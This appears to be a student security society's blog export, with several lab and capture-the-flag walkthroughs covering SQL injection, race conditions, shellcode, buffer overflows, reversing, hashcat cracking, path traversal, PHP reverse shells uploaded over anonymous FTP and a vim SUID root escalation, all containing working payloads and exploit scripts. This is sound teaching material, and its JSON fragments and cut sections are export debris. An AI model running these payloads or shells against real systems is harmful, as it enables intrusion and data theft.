There are a few variations of SQL which have some slight syntactical differences. A few examples are MySQL, SQL Server and SQLite. Question Can you think where databases are used on the web? SQL Example What will this do? SELECT*FROMCustomersWHEREFirstname=\"Jack\"; Answer It will search the table customers and will return all the people with the first name “Jack”. Injection Attacks An injection attack is where a user can trick a server to run a command, via vectors such as an input, header or URL. It is currently in the third position of the OWASP Top 10. The main cause of an injection attack is down to improper user input sanitisation and or validation. Note This does not only include SQL injection, other forms include: - XSS - OS Command Injection SQL Injections SQL injection, sometimes shortened to SQLi, is where you are able to insert commands that are able to effect or retrieve information from databases. It is regularly found on dynamic sites; with WordPress plugins being frequently affected (see CVE-2022-25607 for an example). Info Akamai observed, between 2017-2019, 65.1% of attacks on web applications used SQLi. A Bad Demo Can you spot/exploit the flaw? user=input(\"Enter Username: \") password=input(\"Enter Password: \") sql = 'SELECT * FROM users WHERE user==\"'+user+'\"AND password==\"'+password+'\";' print(\"SQL Command Sent: \", sql, \"\\n\") cursor.execute(sql) user=cursor.fetchall() How To \" OR 1=1; – 'SELECT * FROM users WHERE user==\"'+user+'\"AND password==\"'+ password+'\";' Becomes: SELECT*FROMuserWHEREuser==\"Jack\"ANDpassword==\"\"OR1=1;--\"; The command ends the string then compares 1 with 1 (which equals true) and “–” comments out the rest of the statement. In this case, the whole table would be printed. Can you secure it? Research ways that you can secure the program and implement it. How To Input validation Use ? placeholder Use the fetchone method - this does not secure it, but makes exploitation much easier How am I meant to remember the commands? Thankfully you can use a tool named SQLmap, here is a useful SQLmap Cheatsheet. It is also possible to pair with Burpsuite, to save having specify location. To do this, intercept the request, then save it to a file and use the following command: sqlmap -r filename If it is that easy… If it is that easy, why is it so common? Well, many applications are written in PHP which didn’t originally contain a SQL validation method. This has meant that many have ignored it. The main problem now is that many insecure code examples exist on code forums/sites. Another factor is the use of content management systems. This is because if the underlying system is affected, every website using that platform will be vulnerable. However, this can be a benefit, as it will mean that the code only needs to be updated in one place. More Advanced SQLi Time-based/Blind - Sometimes you cannot see the output, therefore, you can use timers to show your answer. Boolean - It is possible to infer the content inside a database using boolean operators, such as changing the order the way data is displayed to the user based depending on whether a comparison is true. NoSQL, no problem? Some people believe that no-SQL is injection free, but this is false. NoSQL stands for non-relational SQL. Although the syntax is different it is still exploitable. Cheat Sheet. Prevent SQLi Switch to a static site, like Hugo. but you lose some functionality (e.g. forms). Not as beginner friendly.

To recap, as race condition takes advantage of the fact that a system must execute a process in a specific sequence of steps, but due to the nature of modern systems there is an opportunity to alter the environment in which a process in run during this sequence of events. One common form of race condition is a Time-of-Check, Time-of-Use vulnerability (TOCTOU). The powerpoint deck used in the session is available here ","date":"2022-02-17","objectID":"/posts/2022_race_conditions/:0:0","tags":["pwn","web","software_security"],"title":"Exploiting Race Conditions","uri":"/posts/2022_race_conditions/"},{"categories":["Academic Year 2021-22"],"content":"Challenge 0 The first challenge was a simple TOCTOU race condition with very little complexity. The challenge binary was inside a docker container running with SUID privileges and owned by root. Once connected over SSH, we can see the binary in the ctf user’s home directory. The binary takes a file path as an argument, and will print the contents of any file on the filesystem except the flag. In a lot of Linux systems this would be enough for privilege escalation, for example we could attempt to crack the passwords in /etc/shadow or read root ssh keys, but since this is a docker container, and a slightly contrived beginner challenge, root has no password or ssh keys. So how can we read the flag file? Let’s take a closer look at the program. Opening the binary in our decompiler of choice (I’m using Rizin Cutter) we can see the program run entirely in the main function. Let’s note down the sequential steps here. File path is passed to main via command line argument. Introduction text is printed Program checks only 1 command argument has been supplied Program prints more information text lstat is called to get information about the file that was supplied as the argument Program prints more information Program checks to ensure the supplied file is not a symlink If it’s not a symlink, the file is opened Contents of file is written to stdout main returns. For those who don’t know, a symlink is short for symbolic link. A common use for symlinks is for file shortcuts. If we had a file at /home/user/example/directory/useful_file.txt, we could avoid having to type the whole path by creating a symlink in /home/example/useful_file.txt. We could also do this with the flag file in the challenge container. You may wonder why I’m explaining this, it will come in useful later. Full compiler protections are enabled on the binary. ctf@5496255810ec:~$ checksec --file challenge Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled So how could this program be exploited? Well, the file information is retrieved at step 5, but the symlink check happens on step 7, and the file is opened at step 8. In between, text is printed to the screen and various other commands are run. Input/Output such as writing to stdout is very slow, and so as an attacker, there is a small window of opportunity where we could change something to trick the program into doing something unintended. This is the Time-of-Check, Time-of-Use. Consider this, we create an empty file s and supply it as the argument for the challenge binary. The binary then calls lstat on s, and then uses that information to check its not symlink, but between lstat and when the program calls open on the file, we change s to actually be a symlink to /flag. At Time-of-Check, the supplied file passes all the checks, but at Time-of-Use, the file is a symlink allowing us to read the flag. Obviously this is a tiny window of opportunity, hence why we call it a race condition. We will need to program some automation to change the file state very quickly.

In my solution, I fork a Python program, one thread repeatedly runs the program, supplying s as the argument, the other repeatedly switches between s being an empty file and being a symlink to /flag. It’s worth noting that this script is pretty janky. For example the child process that is swapping the files will continue even after the parent has closed. But for challenge 1 it’s enough to get the flag. The solve script is below. #! /usr/bin/python3 import os from pwn import * def step1(): os.unlink(\"s\") os.close(os.open(\"s\", os.O_CREAT)) def step2(): os.unlink(\"s\") os.symlink(\"/flag\", \"s\") if __name__ == \"__main__\": attempts = 0 if os.fork() == 0: forkPID = os.getpid() os.close(os.open(\"s\", os.O_CREAT)) while True: step1() step2() else: while True: attempts += 1 p = process([\"challenge\", \"s\"], level=\"CRITICAL\") result = (p.readall().decode()) if \"cueh\" in result: log.success(result) log.info(f\"Took {attempts}attempts\") break p.close() We can see it took 94 attempts before we won the race. We could take additional steps to increase our chance of winning the race, but it was not needed this time.

We can SSH into a container with a challenge binary. The challenge binary is familiar too, it still accepts a file path as a command line argument. However, this time the program does a size check on the file, if the file is too large it exits. Let’s have a look at the disassembly of this program to see what’s going on. We can see the size check ensures the file being read is less than 0x14 (20) bytes large. Additionally, we can see that rather than calling open and then sendfile, the program reads the file data onto the stack before writing it to stdout. This is a key piece of information, as we know that data of a variable size is being read onto the stack. We should now find out how large the buffer is. We can do this easily by setting a breakpoint on the read system call, noting where the start of the input buffer, and subtract it from the base pointer + 8. So the offset is 0x128, (296) bytes. There are two more pieces to this puzzle, the first is there is a function called win that prints the flag. This simplifies the exploitation process as we can just ret2win rather than having to do a full rop chain. The second is that both PIE and stack canaries have been disabled. This means we could exploit a stack based buffer overflow more easily. Additionally, the lack of PIE means the address of the win function is static, so we do not need to leak any addresses at runtime in order to calculate it’s location. \u003e checksec --file challenge Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2022-02-17","objectID":"/posts/2022_race_conditions/:2:0","tags":["pwn","web","software_security"],"title":"Exploiting Race Conditions","uri":"/posts/2022_race_conditions/"},{"categories":["Academic Year 2021-22"],"content":"Exploitation This time I will demonstrate how we could exploit the race condition simply using bash loops. Let’s connect over SSH on two terminals, then in one set up a loop to run the program with a file argument, and grep for the flag string. We know the flag starts with cueh. while true; do ./challenge test; done | grep -a cueh While this hangs, in another terminal we can craft another bash loop to alter the state of the file test. We know the offset is 296 bytes, so lets enter 296 As for filler, then the address of the win function. We can find the win function using objdump. ctf@2fa1db31da25:~$ objdump -x challenge | grep win 0000000000401236 g F .text 0000000000000075 win We have everything we need to craft the second loop. while (true); do echo -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x36\\x12\\x40\\x00\\x00\\x00\\x00\\x00\\n' \u003e test; echo \"\" \u003e test; done This is enough to get the flag. This hit rate (on my system) is pretty low. A flag only comes out every few seconds - let’s create a filesystem maze to increase the time it takes the program to locate and open the file test. This is because the kernel has to navigate and validate every directory in the path. This essentially widens the window of opportunity for the attacker to make the malicious change to the file. Creating a filesystem maze A file system maze is essentially a way of forcing a process to pointlessly navigate the filesystem in order to find a file. For example, we could create a directory 800 deep, and then place a file in directory 800 which is a symlink back to the directory we started. This could slow things down a bit, but not a lot. We could create lots of maze paths like the directory above but Linux has a file path limit of 4096 bytes. We can overcome this by making a second symlink that points to the end of the file maze path. This means that instead of needing to provide the full path, we can cover a whole maze path in just a few characters. This allows us to craft large mazes that can really slow the kernel down (within the orders of magnitude required in a race). This time, when we run the two bash loops we get \u003e10 hits in just a few seconds, significantly increasing our hit rate.

We moved away from the single threaded binary races and into the world of multi-threaded web races. The web application presents a page with some products. A banner shows that we have 1000 bucks. Items in the shop cost different amounts, however the flag costs more money than we currently have. We can buy things that we can afford, and we can also sell them back to the shop. The vulnerability in this application only presents itself due to the fact that it is mutli-threaded. Had it been single threaded, we would have no race condition. This multi threaded application uses a shared resource without any locking (or similar) mechanisms for the shared resource. Let’s have a look at the sell function. @db.connection_context() def sell(token: str, purchase_id: int) -\u003e (bool, str): purchase_history_objs = PurchaseLog.select().where(PurchaseLog.id == purchase_id) if len(purchase_history_objs) == 0: return False, \"Product does not exist\" purchase_history_obj = purchase_history_objs[0] user_objs = User.select().where(User.token == token) if len(user_objs) == 0: return False, \"Invalid User Token\" user_obj = user_objs[0] if purchase_history_obj.user_id != user_obj.id: return False, \"You did not make this purchase\" # We could have a more complex table... or we can just delete the log -_- PurchaseLog.delete().where(PurchaseLog.id == purchase_history_obj.id).execute() User.update(balance=user_obj.balance + purchase_history_obj.paid_amount) \\ .where(User.id == user_obj.id) \\ .execute() return True, \"\" We can see that the item is sold before the users balance is updated. Had the application been single threaded this would not be a problem, as nothing would use the shared resource in between requests, however it is multi threaded meaning different threads may alter the shared resource without alerting the other threads. This presents us with a race condition, due to the time between the item being sold and the balance being updated, that an adversary could make an unexpected change.

Just read the flag at ‘/flag’. We now know that the flag is placed in a file called “flag” in the root directory of the target. .global _start .intel_syntax noprefix _start: lea rdi, [rip+flag] xor rsi, rsi xor rdx, rdx mov rax, 2 syscall The purpose of this first code is to use sys.open() to grab the file descriptor of our flag. A file descriptor is an unique identifier of a file and is usually a non negative integer. The first three file descriptors are reserved in this order: File descriptor 0: stdin File descriptor 1: stdout File descriptor 2: stderr The previous code loads the path of the flag, specified in a label at the end of the file, in rdi; the two xor instruction set the values of rsi and rdx to 0. Then the value 2 is moved in rax and syscall is executed. The first operation is made in order to set the argument for sys.open() since it needs the path of the file which the FD is going to get stored. Generally, all the values moved in registers before a syscall have the purpose to initialize the arguments for the syscall itself, apart from rax which must contain the value which specify which syscall to execute and will usually store the return value of the syscall. To give a better understanding of the syscall keyword, we can represent it like this: syscall(rax, rdi, rsi, rdx, …) where the arguments are values stored in the registers and have a strict order that can be found here. mov rdi, 1 mov rsi, rax mov rdx, 0 mov r10, 60 mov rax, 40 syscall Now we use sys.sendfile() to print our flag in the terminal. We use sendfile because it allows two file descriptors as arguments, one in input and the other in output; a better representation of sys.sendfile is sys.sendfile(output_fd, input_fd, offset, size) where the offset indicates where to start sending information and the size is the number of bytes that will be sent. As we can see we are sending to stdout (file descriptor 1) the contents of the flag file that we opened before (remember that, in this case, the rax contains the file descriptor for the flag file) starting from byte 0 (start of file) and will be sent 60 bytes (rough estimate, if needed this value can be increased). flag: .string \"flag\" This last part is the label that we called in the first instruction. This label contains the string “flag” which represents the path to our flag file. With this part clarified we can actually understand that, in order to store this string in rdi, we must load the memory address of this label which contains the string (hence why we used lea, which stands for load effective address, instead of mov). We then type our newly finished shellcode into boilerplate.py and press enter we notice that we recieve different text compared with the first attempt (attempted with an empty payload). The target answers our code with a report of the assembly code that will be executed. from pwn import * context.arch = \"amd64\" #context.log_level = debug def print_clean(data): data = data.split(b\"\\n\") for i in data: print(i.decode(\"latin-1\")) # shellcode goes here shellcode = asm(f\"\"\" .global _start .intel_syntax noprefix _start: lea rdi, [rip+flag] xor rsi, rsi xor rdx, rdx mov rax, 2 syscall mov rdi, 1 mov rsi, rax mov rdx, 0 mov r10, 60 mov rax, 40 syscall flag: .string \"flag\" \"\"\") p = remote(\"0.cloud.chals.io\", 0000) print_clean(p.recvuntil(b\"Reading 0x1000 bytes from stdin.\\n\")) p.sendline(shellcode) print_clean(p.readrepeat()) Here’s the solution already implemented in ‘boilerplate.py’ ","date":"2021-11-07","objectID":"/posts/2021_assembly_and_shellcoding_walkthrough/:2:0","tags":["pwn","assembly","shellcode","ctf"],"title":"Walkthrough: Shellcoding Challenges","uri":"/posts/2021_assembly_and_shellcoding_walkthrough/"},{"categories":["Academic Year 2021-22"],"content":"Solution: Shellcode Challenge 2 First thing we do is, like the previous challenge, edit the boilerplate file with the new port and navigate to the target and observing the webpage, we can see that the flag is in the same location but that “This challenge reads in much fewer bytes.” and this statement is reinforced by another line that states the following: “Reading 0x18 bytes from stdin.”. This means that only 24 bytes (0x18 = 24) worth of instructions will be read from standard input, this means that our previous shellcode won’t work anymore since the target will only allow execute the first 24 bytes worth of information. In order to overcome this issue we create a multi stage shellcode, this type of shellcode consists in sending multiple shellcodes during the same connection; in this case we will use a two staged attack. .intel_syntax noprefix .global _start _start: push 0 push 0 pop rdi lea rsi, [rip+9] mov rdx, 250 pop rax syscall This code will allow us to use sys.read() in order to receive instruction from stdin, effectively bypassing the 24 bytes restriction imposed by the challenge. sys.read() requires three arguments: a file descriptor, a buffer and a size value. Being 0 the file descriptor for stdin and the value needed to invoke the syscall, we push two zeros on the stack. We load the memory address which will point to the end of our shellcode in rsi and specify 250 expected bytes. We then invoke the kernel to execute sys.read(). .global _start .intel_syntax noprefix _start: open: lea rdi, [rip+flag] xor rsi, rsi xor rdx, rdx mov rax, 2 syscall sendfile: mov rdi, 1 mov rsi, rax mov rdx, 0 mov r10, 60 mov rax, 40 syscall exit: mov rax, 60 mov rsi, 42 syscall flag: .string \"flag\" The second shellcode is the same shellcode used in challenge 1. shellcode1 = asm(f\"\"\" # stage 1 shellcode goes here \"\"\") shellcode2 = asm(f\"\"\" # stage 2 shellcode goes here \"\"\") p = remote(\"0.cloud.chals.io\", 0000) print_clean(p.recvuntil(b\"Reading 0x18 bytes from stdin.\\n\")) p.sendline(shellcode1) pause(1) p.send(shellcode2) print_clean(p.readrepeat()) In order to successfully execute a multi-stage shellcode we also need to modify the boilerplate.py file since the two scripts must be in different payloads.

The filter only looks for the specific bytes of syscall (0x0f05), sysenter(0x0f34) and int (0x80). There are also other lines which contiain helpful hints to solve this challenge. The answer of this challenge lies in how syscalls are actually executed. I we look at the output of the previous challenge: We notice that “syscall” is nothing more than two bytes (0x0f and 0x05) loaded one after the other. This is confirmed by the fact that if we substitute “syscall” with “.byte 0x0f, 0x05” in the previous challenge, we will obtain the same results. inc byte ptr [rip+evil+1] inc byte ptr [rip+evil] evil: .byte 0x0e .byte 0x04 The previous code is an effective substitute of syscall: it creates a label called “evil” which contains two bytes, 0x0e and 0x04. Before this label is actually run we increase by 1 the values of 0x0e and 0x04 which will now be 0x0f and 0x05.

It is a term used to describe the technique of overflowing a buffer, writing shellcode onto the stack (and sometimes a NOP sled), and then overwriting the return address of a the stack frame with the address near the start of the payload. During the session we also recapped some fundamentals about memory layout and binary protections.

We can confirm this using checksec.

The fact the stack is executable means that shellcode can be entered onto the stack and then get executed, because ASLR is disabled, we can hard code the addresses needed when jumping to the start of our shellcode. Let’s use GDB to collect all the values we need. First we should find the offset to the return pointer, knowing this will allow us to place our own address and the instruction pointer will return there when the function has finished executing. We can use the cyclic command to generate a string where no 8 bytes are the same, entering this into the program will allow us to locate the offset. pwndbg\u003e cyclic 500 -n=8 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa We can then run the program and enter this string. When the program crashes we can see the offset in Pwn-Dbg. The top of the stack pointer indicated the offset to us, we can see the bytes are oaaaaaab. So the offset is 312. pwndbg\u003e cyclic -l oaaaaaab -n=8 312 We confirm this to be true by sending 312 bytes of junk data and then a fake address. If we get a segfault and the malicious address is sitting in the instruction pointer, we got the correct offset. Running the following script and attaching GDB to it will allow us to check this (`attach ). #!/usr/bin/env python3 from pwn import * elf = ELF(\"./challenge\") context.binary = elf #context.log_level = \"debug\" p = process([elf.path]) pause() # pid will be printed here.

Now we simply need to write some shellcode, place it at the start of our buffer, and change the return address to 0x7fffffffd500. Hopefully the comments explain any code. We can also add a NOP sled to allow our return address to be less accurate. (If the ret lands anywehere in the NOP sled will take the rip to our shellcode.)

You can download the demo binary here. Opening the binary in our reversing tool of choice (we will use Rizin Cutter) we can see a number of Windows. By double clicking the main function from the symbols tab on the left, we see that the disassembly and decompilation of the binary is displayed. For this challenge we will just use the decompilation, the disassembly will become more important next week. Next we need to understand what the program does. You may notice that variable names have not survived compilation, which can make the code look quite confusing. We can go through and rename the variables to increase readability. So what does it do? An xor operation is executed on the flag string. An xor operation is executed on another string. Text is displayed to the user via the puts \u0026 printf functions. User input is taken via gets. The user input is compared with the password (from step 2) using strcmp - this stands for string compare and will evaluate to true if both strings match. Dependant on whether step 5 is true or false, a different message is displayed to the user. Presumably if this is true the flag will be displayed. We can run the binary to check our understanding. \u003e ./demon Luciafer v1.0 Say the demon's name to gain access to the secret. Enter the demon's name: foobar That is not the demon's name. We were correct. So our user input is compared with a password string, but the password gets decoded before it is compared with the user input. The same happens with the flag string - it is decoded before checking we have the correct password. This means we can run the program in a debugger, inspect the memory and registers when the string comparison occurs, and grab both the flag and the password. We can open the binary in PwnDbg (GDB), and use starti to set a temporary breakpoint immediately on entry. We can the view the disassembly of the main function to look for the string comparison using the command disassemble main. We can see the libc function strcmp is called at address main+240. 0x0000555555555242 \u003c+221\u003e: call 0x555555555060 \u003cgets@plt\u003e 0x0000555555555247 \u003c+226\u003e: lea rdx,[rbp-0x3b] 0x000055555555524b \u003c+230\u003e: lea rax,[rbp-0x2f] 0x000055555555524f \u003c+234\u003e: mov rsi,rdx 0x0000555555555252 \u003c+237\u003e: mov rdi,rax 0x0000555555555255 \u003c+240\u003e: call 0x555555555050 \u003cstrcmp@plt\u003e 0x000055555555525a \u003c+245\u003e: test eax,eax So let’s set a breakpoint there, we know the value should be in rsi. We can use x to see what value is in an address or register, we can reference registers by prepending the register name with $. We can tell GDB which data type we want to view the data as by using a character after a /. So we can print a string at a specific address x/s. b *main+240 r pwndbg\u003e x/s $rsi 0x7fffffffdb05: \"Adrammelech\" The password is Adrammelech. We can check this by entering it into the program. \u003e ./demon Luciafer v1.0 Say the demon's name to gain access to the secret. Enter the demon's name: Adrammelech You are correct. flag{AdraMMel3ch} This was actually unnecessary because the flag text is stored on the stack already. We can print multiple addresses at a time by inserting a number before specifying the data type. pwndbg\u003e x/5s $rsp 0x7fffffffdaf0: \"flag{AdraMMel3ch}\" So this demonstration shows why hard coding passwords, and operating on sensitive data before verifying access rights is bad IT security practice.

You can download the binary here. Opening the binary in Cutter and looking at the code, we can see the code is similar to the previous demo and that we could solve it using the previous method - but let’s imagine the flag is inaccessible and we need to manually decode the password in order to access the flag. The important section is this if statement, we can see some stack addresses are compared to hex values, so the hex values must represent the password, so let’s just decode that. if (((iStack536 == 0x68632d746e753063) \u0026\u0026 (iStack528 == 0x6c756330)) \u0026\u0026 (iStack524 == 0x61)) We can do this simply in ipython (I know there are more efficient ways to do it but this was done impromptu in the demo).

First assign values x = 10 y = 5 z = 2 a = 4 Let’s start by push x,y,z,a to the stack. Since the stack is LIFO we should push in reverse order, so that we can access x \u0026 y first.

A network is a group of interconnected computers, which are assigned an IP address. The whole point of scanning a network is to discover which IP addresses are in use across the network (so we can target them in the port scanning phase). There are a few ways to go about this, each with pro’s and con’s: Wire-tap Can be done by plugging a device into the network, or the functionality can be emulated by software like wireshark Records each packet that passes it Main advantage to this method it is quiet, hence useful for red teaming situations Main disadvantage is that it can be slower and miss devices ARP Scan The Address Resolution Protocol is used to find the MAC address of a computer on a local subnet Main advantage of ARP is that it cannot be disabled in IPv4 and you can find out the manufacturer of each device Main disadvantage is that you can only find devices on your local subnet Ping Sweep This sends an ICMP request to every device on the network If there is a response, a machine is at that address As it is a layer 3 protocol, it can reach devices on other subnets (hence finding more) Main disadvantage is that more and more devices will not respond to ping requests (so that they will not be discovered), for example this behaviour is blocked by default in Windows 10.

We have hashed. Now, we can try some brute-forcing. However, this would get us nowhere unless we pay attention to the notes left in the /home/intern/ directory. Efforts to get the boss to give me the credentials for root on this machine haven't been going well. Luckily I have a pretty good idea of what it could be so I can start guessing it. Here is what I know - I know my boss set the password - He has a cat called Collin - He has a daughter called Holly - The password he set for Splunk was h0lly_2001 Now we can use this info and hashcat rules to crack the password. So, if we already have one password we can use it as a template. Let’s begin with the names. We can put them into a wordlist. ❯ cat \u003c EOF \u003e names.list \u003e Collin \u003e collin \u003e Holly \u003e holly \u003e EOF Now we can use a little bit of hashcat-fu and generate a new wordlist from our names. For this purpose, we can use rules. If you are not familiar with hashcat rules, check out their documentation The rules I am going to use to generate the new wordlist are pretty much going to replace symbols like “s” with “$”, “a” with “4”, and so on. That is the content of the file I am going to use: : l u sa4 sa@ sb6 sc\u003c sc{ se3 sg9 si1 si! sl1 so0 sq9 ss5 ss$ st7 st+ sx% sa@sc\u003cse3sl1si1so0ss$ lsa@sc\u003cse3sl1si1so0ss$ usa@sC\u003csE3sL1sI1sO0sS$ sa@sc\u003cse3sl1so0ss$ lsa@sc\u003cse3sl1so0ss$ usa@sC\u003csE3sL1sO0sS$ sa@sc\u003cse3si1so0ss$ lsa@sc\u003cse3si1so0ss$ usa@sC\u003csE3sI1sO0sS$ The command to generate it is: hashcat -r rules names.list --stdout \u003e wordlist.list And once we have generated our new wordlist, we can try brute-forcing the password with a mask attack that is going to look like this: hashcat -m 1800 -a 6 hash.txt wordlist.list ?1?2?3?d?d -1 _- -2 12 -3 90 This mask will append - or _ to the end of each word with folowing all the ears from 1900 to 2099.

Another spelling error can occur due to inconsistencies between American and British spellings - this can then cause code not to function; an example of this is ‘colour’ and ‘color’. Permissions - when running some commands in Linux, you will need to run the command as an administrator (aka Super User). One example of this is you need to have admin permission to run anything on the common ports. Thankfully, this is a quick fix in Linux, and all you need to do is add sudo before the command or if you are using the fancy new Z shell, just type sudo !! and it will automatically run the last command as root. Networking \u0026 VM’s - a common issue when using virtual machines is choosing the right networking mode. If you wish to access the internet; we recommend that you use ‘NAT’ networking but be careful when typing IPs as you now run the risk of scanning the wrong machine (and if you do, you can face legal consequences from the owner). If you are trying to run a network between two VMs, you must ensure that they are both in the same networking mode. Python Version - hackers seem to be increasingly turning to Python to run proof of concepts in Python - but you must ensure that you run it in the right version. Currently, there are two major branches of Python; Python2 (which is now deprecated) and Python3. Unfortunately, Python2 cannot run Python3 code and vice versa, therefore if the code will not run in one version, try it in the other. A quick way to tell the Python version is to look at the print statements; in Python3 print statements look like this print(\"Hello World\") and in Python2 they are as follows print \"hello world\" (notice without brackets). Missing Python Module - if you receive a ‘submodule cannot be found error’, then you probably will need to install it (have a look at using pip).

Many believe that Hi Vis jackets make people look more authoritative and official - therefore they are more likely to listen to them. To prove this point comedian and scientist Eline van der Velden donned a jacket and clipboard; then asked random people to complete ridiculous requests - see the results below. The Milgram Experiment The above was done to prove a point and builds on more historic research. In 1963 Stanley Milgram investigated the difference between obedience and free will. The main reason for this was at the time the Nuremberg War Criminal trials were taking place; and many people argued they carried out genocides as they were just following orders. The experiment worked by attaching someone to an electric shock machine. Then a volunteer had to ask that person questions; if they got one wrong, they would have to administer an electric shock - each one progressively worse. If the volunteer declined, they were told they must by an authoritative figure. In a similar experiment, Milgram repeated it with people wearing uniform - one was with the authoritative figure wearing a grey lab coat and one wearing plain clothes. 20% more people would listen to the person wearing the lab coat.

So, examples are: https://example.com?file=../../../etc/passwd - can be used to find usernames https://example.com?file=../../root/flag.txt - can be used to find root flag files ","date":"2020-10-22","objectID":"/posts/web_enum/:6:1","tags":["reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration","uri":"/posts/web_enum/"},{"categories":["Academic Year 2020-21"],"content":"Web Shells Probably one of the most useful ways to exploit a webserver is when you can upload a shell - allowing command execution. This can be done either by file upload or via uploading to an anonymous FTP server (but there are also other methods). There are two main web shells that I recommend, the first being p0wny@shell:~#. This is the friendlier of the two as you can access it via a webpage, however it has less features (but they are more than adequate for this week’s challenge). The second of the two is my favourite and is the Pentest Monkey Reverse TCP shell. The downside to this is that you must edit the file to include your attacking IP address and port number, as well as setting up a netcat listener. The benefit is that you can interact with it through your command line.

Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds It looks like we have 4 ports open. Let’s check out the web server. From the scan, we can see that there is a directory named /ftp-uploads and we can see that a flag file has been stored. So you have one flag.To be honest this flag works more like a hint to tell you what you should do after this. So if you go back to your nmap scan you will see that you have a line “21/tcp open ftp Pure-ftp” so we have a file transfer protocol it is always good to check as this can sometimes be used for file upload to the machine you are attacking. But what’s the mean of ftp-anonymous if you do a fast google search you will find out that when this happens you can have acces to ftp server without having to know the credentials.So lets try to connect to the ftp. ftp 192.168.42.1 You will be asked to input the Name. You just have to type anonymous to connect. If you do a “ls” you will be able do see the a file called FTPflag.txt which is the same file you found in the website. You type help you will see as the commands that you can use inside the ftp, we want to upload p0wnyshell so that we can get access to the machine through the browser. For now you just need to know that we are using p0wnyshell as our reverse-shell. So “ctrl+c” to stop the ftp connection clone p0wny shell repository P0wny-Shell. cd p0wny-shell ftp 192.168.42.1 put shell.php The last command is going to upload our shell. If you go back to your browser and back to “/ftp-uploads/anonymous” you will see the file shell.php in there clicked and you will have p0wny-shell.So you succefully entered the machine. Let’s look for the last flag. A easy way to find files on linux is using the file command. find / -name \"*.txt\" 2\u003e/dev/null Congratulations!

We mangled the ports from the StandardPorts sudo nmap -sC -sV 192.168.42.1 -p- In this challenge the ftp part is the same as the first challenge and the first flag is the same, the only difference is that the ports have been changed so if you to “http://192.168.42.1” the website is not going to load you need to instead look for something like this “192.168.42.1:8080”. So lets pass to the second part uploading files to ftp. We have ftp running on port 2121 (2121/tcp ccproxy-ftp) last time you use “ftp $ip” to connect this time that wont work cause you will need to specify the port os instead use something like this “ftp $ip port” ftp 192.168.42.1 2121 Again use anonymous as login. In this challegne we introduced privesc so we will need a scrip to enumerate all te services that are being run on the machine, file permissions, file types, sym links ,etc. There are 2 that are I know, LinEnum and linpeas. I prefer linpeas{target=_blank}, instead of cloning the repository what I did is I open my prefered text editor on my kali box and I just copy/pasted the script. Then I stopped the ftp connection I cd to the directory where I have linpeas, I started the connection again and use the “put linpeas.sh” to copy linpeas to the machine. Besides linpeas we will need a php reverse shell, cause p0wny shell is not going to work in this challenge. Another good resource to put in your bookmarks, PentestMonkeys{target=_blank} I did the same process with both linpeas and the php-reverse-shell{target=_blank} so open your editor and “ctrl+c / ctrl+v” put hte ip of your kali box in the line where you see \"\" \\change this\" and upload the file to the ftp. So right now you should see something like this Which means you ready. Open a terminal and start netcat. nc -lvnp 1234 Go to “192.168.42.1:8080/ftp-uploads/php-reverse-shell.php” the site should be loading for ever. If you go back to your terminal you should have access to the box. Tip: everytime I get a reverse shell I try to find out what user I am. whoami Lets not forget we are in /var/www , we need to copy our linpeas script to tmp folder. cp linpeas.sh /tmp chmod +x linpeas.sh ./linpeash.sh Take a look at the output and try to find the SUID section. If you don’t know SUID is a type of permission that you have on linux that let’s the user run the file or binary. That last line mentioning vim.basic maybe we can do some research and see how we can exploit it. Fortunately there is a good resource called GTFOBins which is used for looking how we can exploit binaries look for vim and you will see that you can spawn a shell inside vim or using the command. :!/bin/sh #or vim -c ':!/bin/sh' Now you are root! cd /root cat flag.txt Congratulations on solving the first ComSec challenge.

The point of this is to be able to identify targets IP addresses and their open ports (from this you can gleam some of the services/software a server uses). The most popular tool to do this is named Nmap. Why Port Scan? First step on most challenges Find programs running on devices Find program versions and find associated vulnerabilities OS detection Easy to do The main disadvantage is that it can be ‘loud’ and detected by IDS/IPS. Types of Scans Due to different types of technologies, there are multiple ways to scan targets, the main ones are described below: TCP Stealth Scan TCP is a connection-oriented method used by most protocols (e.g., SSH, HTTP, HTTPS). It has the following stages known as a handshake: Syn – client device initiates and attempts to establish connection Syn-ack – server acknowledges receipt of syn Ack – client acknowledges receipt of syn-ack, and communication will start Fin – terminates connection A TCP scan uses this to its advantage, it sends a syn packet and if a syn-ack packet is received, the port is open. The connection is then dropped, before the host fully recognises the connection. Ping Scan Sends an ICMP packet to specified hosts, if there is a response, you know it is up. UDP Scan Sends UDP packet, if there is a response it is open, if there is no response it is open or filtered. If the port is unreachable, it is closed. ARP Scan Sends an ARP request and waits for responses. Listening Just listens to network traffic and can detect which devices are communicating.
